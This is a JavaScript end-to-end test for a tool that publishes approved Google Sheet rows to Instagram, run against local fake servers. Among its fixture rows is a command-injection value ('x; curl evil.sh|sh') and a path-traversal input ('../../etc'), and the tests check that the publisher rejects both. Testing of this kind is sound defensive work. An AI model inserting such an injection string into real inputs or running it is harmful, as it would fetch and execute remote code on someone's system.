// Tests the publisher end to end against a fake Instagram and a fake Google Sheet.
// Nothing real is called. Run from tools/social:  node publish/test-publish.js
// Needs these posts built first: npm run build-post posts/01-launch, and the same for posts/04-fee-support and posts/06b-1-week-left.
import http from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { fileURLToPath } from 'node:url';

const execFileP = promisify(execFile);
const HERE = path.dirname(fileURLToPath(import.meta.url));
const TOOL = path.join(HERE, '..');
let failures = 0;
const ok = (cond, msg) => { console.log(`${cond ? 'ok  ' : 'FAIL'} ${msg}`); if (!cond) failures++; };

// ---- a fake Instagram Graph API ----
const calls = [];
const fail = { media: false, publish: false };
const ig = http.createServer((req, res) => {
  let body = '';
  req.on('data', (c) => { body += c; });
  req.on('end', () => {
    const p = new URLSearchParams(body);
    calls.push({ method: req.method, url: req.url, auth: req.headers.authorization, params: Object.fromEntries(p) });
    res.setHeader('content-type', 'application/json');
    if (req.method === 'GET') return res.end(JSON.stringify({ status_code: 'FINISHED' }));
    if (req.url.endsWith('/media') && fail.media) { fail.media = false; res.statusCode = 400; return res.end(JSON.stringify({ error: { message: 'fake failure' } })); }
    if (req.url.endsWith('/media_publish') && fail.publish) { fail.publish = false; res.statusCode = 502; return res.end('{}'); }
    if (req.url.endsWith('/media')) return res.end(JSON.stringify({ id: `c${calls.length}` }));
    if (req.url.endsWith('/media_publish')) return res.end(JSON.stringify({ id: `pub${calls.length}` }));
    res.statusCode = 404; res.end('{}');
  });
});
await new Promise((r) => ig.listen(0, r));
const IG = `http://127.0.0.1:${ig.address().port}/v23.0`;

const env = { ...process.env, IG_GRAPH_URL: IG, IG_USER_ID: '123', IG_ACCESS_TOKEN: 'test-token', MEDIA_BASE_URL: 'https://example.test/posts', IG_POLL_MS: '1' };
delete env.GITHUB_OUTPUT;
// Async on purpose: the fake servers live in this process, so it must keep answering while the publisher runs.
// Returns stdout (and stderr, except for "due", whose stdout the workflow reads) plus the exit code.
async function run(...a) {
  try {
    const r = await execFileP('node', ['publish/publish.js', ...a], { cwd: TOOL, env, encoding: 'utf8', timeout: 120000 });
    return { out: a.includes('due') ? r.stdout : r.stdout + r.stderr, err: r.stderr, code: 0 };
  } catch (e) {
    return { out: a.includes('due') ? e.stdout : (e.stdout ?? '') + (e.stderr ?? ''), err: e.stderr ?? '', code: e.code ?? 1 };
  }
}

const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pharos-q-'));
const fixture = path.join(dir, 'rows.json');
const setRows = (rows) => fs.writeFileSync(fixture, JSON.stringify(rows));
const read = () => JSON.parse(fs.readFileSync(fixture, 'utf8'));
const F = `--fixture=${fixture}`, NOW = '--now=2026-11-16T09:30';
const row = (n, post, type, post_at, status, extra = {}) => ({ row: n, post, type, post_at, status, ...extra });

// ---- prepare ----
await run('prepare', '01-launch', '04-fee-support', '06b-1-week-left');
const jp = (f) => fs.readdirSync(path.join(TOOL, 'posts', f, 'output', 'jpeg'));
ok(jp('01-launch').filter((x) => x.startsWith('feed-')).length === 4, 'prepare makes 4 feed JPEGs for the launch post');
ok(jp('04-fee-support').some((x) => x.startsWith('story-')), 'prepare makes story JPEGs too');
ok((await run('prepare', '../../etc')).code !== 0, 'prepare refuses a folder name that isn\'t a post folder');

// ---- which rows count as due ----
setRows([
  row(2, '01-launch', 'feed', '2026-11-16 08:00', 'Approved'),
  row(3, '02-pinned-rules', 'feed', '2026-11-16 08:05', 'Draft'),
  row(4, '05-where-your-fee-goes', 'feed', '2026-11-19 19:00', 'Approved'),
  row(5, '04-fee-support', 'story', '2026-11-16 9:00:00', 'approved'),
  row(6, '03-essay-tips', 'feed', '2026-11-16 08:10', 'Rejected'),
  row(7, '06a-2-weeks-left', 'feed', '', 'Approved'),
  row(8, 'x; curl evil.sh|sh', 'feed', '2026-11-16 08:00', 'Approved'),
  row(9, '03-essay-tips', 'stroy', '2026-11-16 08:00', 'Approved'),
  row(10, '01-launch', 'feed', '2026-11-16 08:30', 'Approved'),
  row(11, '06b-1-week-left', 'feed', 46342.375, 'Approved'),   // Sheets serial for 16 Nov 2026 09:00 (MYT wall clock)
  row(12, '06c-3-days-left', 'feed', 46342.4375, 'Approved'),  // 16 Nov 2026 10:30, after "now"
]);
const due = await run('due', F, NOW);
ok(due.out.trim() === '01-launch 04-fee-support 06b-1-week-left', `"due" lists only valid, approved rows whose time has passed (got "${due.out.trim()}")`);
ok(!/curl|stroy|;/.test(due.out), '"due" never prints anything typed into the sheet except checked folder names');
ok(/isn't a post folder/.test(due.err) && /Type must be feed or story/.test(due.err) && /only the first is posted/.test(due.err), '"due" explains the bad name, bad type and duplicate row');

const dry = await run(F, NOW);
ok(/would post 01-launch as feed \(4 images\)/.test(dry.out), 'dry run would post the launch carousel');
ok(/would post 04-fee-support as story/.test(dry.out), 'dry run would post the story');
ok(/would post 06b-1-week-left/.test(dry.out) && !/would post 06c/.test(dry.out), 'a date Sheets stored as a serial number is read as Malaysia time');
ok(!/would post (05-where|02-pinned|03-essay)/.test(dry.out), 'dry run skips future, draft, rejected and bad-type rows');
ok(/"Post at" is empty/.test(dry.out), 'an approved row with no time is skipped and says why');
ok(dry.code !== 0, 'a run with problem rows exits as failed, so someone notices');
ok(calls.length === 0, 'dry run calls Instagram 0 times');

// ---- live ----
await run('--live', F, NOW);
let after = read();
const byRow = (n) => after.find((r) => r.row === n);
ok(byRow(2).status === 'Published' && /^pub\d+$/.test(byRow(2).instagram_id), 'live: launch post marked Published with its Instagram id');
ok(byRow(5).status === 'Published', 'live: story marked Published');
ok(byRow(10).status === 'Approved' && /only the first is posted/.test(byRow(10).last_error), 'live: the duplicate row is not posted and says why');
ok(byRow(8).status === 'Approved' && /isn't a post folder/.test(byRow(8).last_error), 'live: the row with a bad name is not posted and says why');
ok(byRow(4).status === 'Approved' && !byRow(4).instagram_id, 'live: the 19 Nov post is untouched until its time');
ok(byRow(3).status === 'Draft' && byRow(6).status === 'Rejected', 'live: draft and rejected rows untouched');
const carousels = calls.filter((c) => c.params.media_type === 'CAROUSEL');
ok(carousels.length === 1 && carousels[0].params.children.split(',').length === 4, 'live: the launch carousel is built from 4 slides, and posted once');
ok(carousels[0].params.caption.startsWith('Pharos is an essay competition'), 'live: caption sent with the carousel');
ok(calls.some((c) => c.params.media_type === 'STORIES' && c.params.image_url.includes('/04-fee-support/output/jpeg/story-')), 'live: story uses the 1080x1920 story image');
ok(calls.filter((c) => c.params.is_carousel_item).every((c) => c.params.alt_text), 'live: every carousel slide has alt text');
ok(calls.filter((c) => c.method === 'GET').every((c) => c.auth === 'Bearer test-token' && !c.url.includes('test-token')), 'live: the token is sent in a header, never in a URL');

const before = calls.length;
await run('--live', F, NOW);
ok(calls.filter((c, i) => i >= before && c.url.endsWith('/media_publish')).length === 0, 'running again posts nothing twice');
after = read();
ok(after.find((r) => r.row === 10).status === 'Approved' && /already been posted/.test(after.find((r) => r.row === 10).last_error), 'a second row for a post that already went out is refused, even once it is first in line');

// ---- failures ----
setRows([row(2, '01-launch', 'feed', '2026-11-16 08:00', 'Approved')]);
fail.media = true;
await run('--live', F, NOW);
after = read();
ok(after[0].status === 'Approved' && /fake failure/.test(after[0].last_error) && after[0].attempts === '1', 'a failure before anything was sent goes back to Approved, with the error and attempt 1');

setRows([row(2, '01-launch', 'feed', '2026-11-16 08:00', 'Approved', { attempts: '2' })]);
fail.media = true;
await run('--live', F, NOW);
ok(read()[0].status === 'Failed', 'after 3 failed attempts the row is set to Failed and not tried again');

setRows([row(2, '01-launch', 'feed', '2026-11-16 08:00', 'Approved')]);
fail.publish = true;
await run('--live', F, NOW);
after = read();
ok(after[0].status === 'Check on Instagram' && /May have posted/.test(after[0].last_error), 'if the publish call itself fails, the row is set to "Check on Instagram", not retried');
const n1 = calls.length;
await run('--live', F, NOW);
ok(calls.length === n1, 'a "Check on Instagram" row is never retried on its own');

setRows([row(2, '01-launch', 'feed', '2026-11-16 08:00', 'Approved')]);
const n2 = calls.length;
env.FIXTURE_FAIL_WRITE = '1';
const w = await run('--live', F, NOW);
delete env.FIXTURE_FAIL_WRITE;
ok(w.code !== 0 && calls.length === n2, 'if the sheet can\'t be written, nothing is posted');

// ---- sheet.js against a fake Google: sign-in token, header check, read, write ----
const { privateKey, publicKey } = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
const HEADER = ['Post', 'What it is', 'Type', 'Post at (MYT)', 'Status', 'Approved by', 'Approved on', 'Instagram ID', 'Published at', 'Notes', 'Last error', 'Attempts'];
let wrote = null, jwtOk = false, header = HEADER, readQuery = '';
const g = http.createServer((req, res) => {
  let body = '';
  req.on('data', (c) => { body += c; });
  req.on('end', () => {
    res.setHeader('content-type', 'application/json');
    if (req.url === '/token') {
      const [h, c, s] = new URLSearchParams(body).get('assertion').split('.');
      const v = crypto.createVerify('RSA-SHA256'); v.update(`${h}.${c}`);
      jwtOk = v.verify(publicKey, Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64'));
      return res.end(JSON.stringify({ access_token: 'g-token' }));
    }
    if (req.headers.authorization !== 'Bearer g-token') { res.statusCode = 401; return res.end('{}'); }
    if (req.method === 'GET') { readQuery = req.url; return res.end(JSON.stringify({ values: [header, ['01-launch', 'Launch', 'feed', 46342.333333, 'Approved'], [], ['02-pinned-rules', 'Rules', 'feed', '', 'Draft']] })); }
    if (req.method === 'PUT') { wrote = { url: decodeURIComponent(req.url), body: JSON.parse(body) }; return res.end('{}'); }
  });
});
await new Promise((r) => g.listen(0, r));
const G = `http://127.0.0.1:${g.address().port}`;
process.env.SHEETS_API_URL = `${G}/sheets`;
const sheet = await import('./sheet.js?' + Date.now());
const key = { client_email: 'bot@test.iam.gserviceaccount.com', private_key: privateKey.export({ type: 'pkcs8', format: 'pem' }), token_uri: `${G}/token` };
const tok = await sheet.getAccessToken(JSON.stringify(key));
ok(tok === 'g-token' && jwtOk, 'Google sign-in token is signed correctly with the service account key');
const q = await sheet.readQueue('SHEET', tok);
ok(q.length === 2 && q[0].row === 2 && q[0].status === 'Approved' && q[1].row === 4, 'reads queue rows with their sheet row numbers, skipping blank rows');
ok(typeof q[0].post_at === 'number' && /UNFORMATTED_VALUE/.test(readQuery), 'reads dates unformatted, as serial numbers, so display formats can\'t break them');
await sheet.writeResult('SHEET', tok, 2, { status: 'Published', instagram_id: 'pub1' });
ok(wrote && wrote.url.includes('Queue!E2:L2') && wrote.body.values[0][0] === 'Published' && wrote.body.values[0][3] === 'pub1' && wrote.body.values[0][1] === null, 'writes only Status and the columns to its right, and leaves the rest alone');
header = ['Post', 'Type', 'What it is', ...HEADER.slice(3)];
let refused = false;
try { await sheet.readQueue('SHEET', tok); } catch (e) { refused = /header row doesn't match/.test(e.message); }
ok(refused, 'refuses to run if the columns have been moved or renamed');

ig.close(); g.close();
fs.rmSync(dir, { recursive: true, force: true });
console.log(failures ? `\n${failures} failed` : '\nall passed');
process.exit(failures ? 1 : 0);
